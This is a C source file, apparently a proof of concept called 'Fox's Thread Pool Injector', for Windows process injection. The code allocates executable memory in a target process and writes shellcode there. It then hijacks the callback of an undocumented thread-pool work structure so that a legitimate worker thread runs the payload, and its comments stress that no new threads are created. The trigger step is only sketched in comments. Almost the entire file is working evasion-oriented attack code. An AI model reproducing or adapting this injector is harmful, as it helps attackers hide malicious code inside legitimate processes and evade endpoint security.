#include <windows.h>
#include <stdio.h>

// Undocumented Thread Pool structures (simplified for PoC)
typedef VOID(NTAPI* PTP_WORK_CALLBACK)(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK);

struct FULL_TP_WORK {
    struct TP_CLEANUP_GROUP* CleanupGroup;
    PTP_CLEANUP_GROUP_CANCEL_CALLBACK CleanupGroupCancelCallback;
    PVOID FinalizationCallback;
    struct ACTIVATION_CONTEXT* ActivationContext;
    PVOID WorkCallback; // <-- The golden ticket
    PVOID CallbackContext;
    // ... padding/internal state omitted for brevity
};

// Fox's Thread Pool Injector
void InjectViaThreadPool(HANDLE hProcess, PVOID pShellcode, SIZE_t shellcodeSize) {
    // 1. Allocate memory for shellcode and our fake TP_WORK structure in the target
    PVOID pTargetShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pTargetShellcode, pShellcode, shellcodeSize, NULL);

    PVOID pTargetWork = VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 2. Create a legitimate TP_WORK object locally to get the correct internal OS initialization
    PTP_WORK pLocalWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)pTargetShellcode, NULL, NULL);
    
    // 3. Cast it to the undocumented structure so we can manipulate it
    FULL_TP_WORK* pFullWork = (FULL_TP_WORK*)pLocalWork;

    // 4. Overwrite the callback to point to our shellcode in the target process
    pFullWork->WorkCallback = pTargetShellcode;
    pFullWork->CallbackContext = NULL;

    // 5. Write the modified TP_WORK structure into the target process
    WriteProcessMemory(hProcess, pTargetWork, pFullWork, sizeof(FULL_TP_WORK), NULL);

    // 6. Trigger the execution.
    // In a full implementation, you duplicate the target's TpWorkerFactory handle 
    // and use NtSetInformationWorkerFactory, or hijack an existing queued item.
    // For this PoC, we assume we've linked it to the target's environment.
    
    printf("[+] TP_WORK structure injected at %p\n", pTargetWork);
    printf("[+] Shellcode queued to target's native thread pool.\n");
    printf("[+] Legitimate worker thread will execute it. No new threads created.\n");

    // Clean up local handle (do not wait, as it executes remotely)
    // CloseThreadpoolWork(pLocalWork); 
}